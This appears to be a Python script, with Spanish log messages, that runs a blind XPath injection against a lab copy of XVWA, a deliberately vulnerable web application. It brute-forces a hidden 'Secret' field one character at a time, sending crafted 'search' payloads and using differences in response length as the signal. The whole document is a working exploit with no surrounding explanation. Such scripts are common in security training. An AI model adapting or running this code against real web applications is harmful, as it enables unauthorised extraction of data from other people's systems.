#!/usr/bin/python3

from pwn import *

import requests
import time
import sys
import string
import signal
import pdb

def def_handler(sig, frame): 
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)
    
# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://10.10.10.10/xvwa/vulnerabilities/xpath/"
characters = string.ascii_letters + ' '

def xPathInjection(): 

    data = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)
    
    p2 = log.progress("Data")

    for first_position in range (1, 100):
        for character in characters: 

            post_data = {
                    'search': "1' and substring(Secret,%d,1)='%s" % (first_position, character),
                    'submit': ''
            }

            r = requests.post(main_url, data=post_data)

            if len(r.text) != 8676 and len(r.text) != 8677:
#               print(len(r.text))
                data += character
                p2.status(data)
                break

    p1.success("Ataque de fuerza bruta concluido")
    p2.success(data)

if __name__ == '__main__':

    xPathInjection()
